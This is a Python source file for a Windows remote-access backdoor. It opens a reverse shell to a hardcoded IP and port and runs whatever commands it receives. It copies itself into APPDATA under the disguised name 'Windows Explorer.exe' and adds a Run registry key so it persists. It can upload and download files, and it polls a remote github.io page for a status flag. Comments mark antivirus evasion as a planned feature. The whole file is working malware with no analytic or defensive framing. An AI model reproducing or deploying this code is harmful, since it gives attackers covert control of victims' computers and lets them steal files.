#!/usr/bin/env python2.7

import socket

import subprocess

import json

import os

import base64

import sys

import shutil

import requests



IP = "192.168.1.50".encode('utf-8') # change this

PORT = 4445 # change this (Integer Only)

class MotherFucker():

    def __init__(self, ip, port):

        self.persistence()

        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.connection.connect((ip, port))

    def persistence(self):

        """

        Windows bullshit 

        adds it self to registery and starts fucking arount

        """

        location = os.environ["appdata"] + "\\Windows Explorer.exe"

        if not os.path.exists(location):

            shutil.copyfile(sys.executable, location)

            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)

            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)

            

    def json_send(self, data):

        """

            Basically just dumps  output of commands   in a json  format and send it over

        """

        json_data = json.dumps(data).encode('utf-8')
        
        self.connection.send(json_data)

    def json_recv(self):

        """

            so basically just dumps the commands recived from client in a json  format 

        """

        json_data = ""
        while True:

            try:

                json_data += self.connection.recv(1024).decode('utf-8')

                return json.loads(json_data)

            except ValueError:

                continue

    def change_working_dir(self, path):

        """

        Changes Working directory basicly a $ cd whatever

        """

        os.chdir(path)

        return "Changed dir to %s" % path

    def write_file(self, path, content):

        """

        Gets file from client and writes it to hard drive

        """

        with open(path, "wb") as file:

            decoded_file = base64.b64decode(content)

            file.write(decoded_file)

            return "Uploaded Successfully !"

    def read_file(self, path):

        """

        Gets file from hard drive and sends it to Client :)

        """

        with open(path, "rb") as file:

            encoded_file = base64.b64encode(file.read())

            return encoded_file

    def execute_system_command(self, command):

        """

            used check_output instead of call or run or whatever else cause it actualy sends the result of command back and we can see it in Client

        """

        return subprocess.check_output(command, shell=True)



    def run(self):
        # while loop for never stopping 
        while True:
            # gets the cmd
            rcvd_cmd = self.json_recv()

            try:

                #TODO:add auto remove program

                # closes the connection and exit the program 

                if rcvd_cmd[0] == "exit":

                    self.connection.close()

                    sys.exit() 

                # cd function 
                elif rcvd_cmd[0] == "cd" and len(rcvd_cmd) > 1:
                    cmd_rslt = self.change_working_dir(rcvd_cmd[1])
                # send over files
                elif rcvd_cmd[0] == "download":

                    cmd_rslt = self.read_file(rcvd_cmd[1])

                # downloads files

                elif rcvd_cmd[0] == "upload":

                    cmd_rslt = self.write_file(rcvd_cmd[1], rcvd_cmd[2])

                # custom cmd exec

                else:

                    cmd_rslt = self.execute_system_command(rcvd_cmd)

            except Exception as e:

                cmd_rslt = "[-] Error During Command Execution.\n {}".format(e)

            self.json_send (cmd_rslt)



def get_status():

    #TODO: AES Encyrpt the freaking link

    s = requests.get('https://poggerpussy.github.io').text

    #status = re.sub(r"<.*?>",'', s)

    if s == "true":

        return True

    return False



#TODO: AV-Evasion Confirmation
try:

    jja213415 = MotherFucker(IP, PORT)
    jja213415.run()
except Exception:
    sys.exit()
